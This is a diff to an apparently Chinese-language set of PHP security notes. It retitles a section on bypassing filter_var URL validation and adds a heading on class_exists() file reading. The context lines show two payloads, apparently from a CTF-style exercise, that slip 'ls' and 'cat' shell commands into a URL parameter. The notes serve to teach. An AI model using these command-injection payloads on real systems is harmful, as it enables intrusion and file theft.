@@ -46,7 +46,7 @@ sql注入等。
 
 
 ^
-## **5、filter_var过滤url格式**
+#### **5、filter_var过滤url格式**
 ```
 $url = $_GET['url'];
 if(isset($url) && filter_var($url, FILTER_VALIDATE_URL)){
@@ -61,3 +61,7 @@ payload
 ?url=demo://%22;ls;%23;sec-redclub.com:80/
 ?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/
 ```
+
+
+^
+#### **6、class_exists()任意文件读取**
